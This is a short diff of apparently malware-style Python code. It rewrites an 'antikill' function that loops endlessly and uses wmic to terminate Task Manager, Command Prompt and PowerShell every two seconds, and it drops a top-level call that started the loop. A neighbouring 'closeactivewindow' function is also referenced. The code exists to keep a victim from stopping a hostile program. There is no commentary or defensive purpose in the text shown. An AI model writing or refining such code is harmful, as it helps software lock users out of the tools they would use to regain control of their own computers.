@@ -52,15 +52,14 @@ def closeactivewindow():
             continue
 
 def antikill():
+    tokill = ["taskmgr.exe", "cmd.exe", "powershell.exe"]
     while True:
-        try:
-            subprocess.getoutput("wmic process where name=\"taskmgr.exe\" delete")
-            subprocess.getoutput("wmic process where name=\"cmd.exe\" delete")
-            subprocess.getoutput("wmic process where name=\"powershell.exe\" delete")
+        for process in tokill:
+            try:
+                subprocess.getoutput(f"wmic process where name={process} delete")
+            except:
+                continue
             time.sleep(2)
-        except:
-            continue
-antikill()
 
 
 
